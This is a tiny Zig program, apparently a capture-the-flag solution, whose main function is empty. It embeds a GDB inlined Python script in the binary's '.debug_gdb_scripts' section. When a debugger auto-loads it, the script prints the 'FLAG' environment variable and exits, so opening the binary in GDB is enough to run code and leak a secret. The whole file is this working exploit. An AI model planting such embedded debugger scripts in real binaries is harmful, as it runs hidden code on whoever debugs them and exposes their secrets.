const std = @import("std");

const script = "\x04" ++
    "gdb.inlined-script\n" ++
    "import os\n" ++
    "print(os.getenv('FLAG'))\n" ++
    "exit(0)\n" ++
    "\x00";

export const DEBUG align(8) linksection(".debug_gdb_scripts") = script.*;

pub fn main() !void {
}
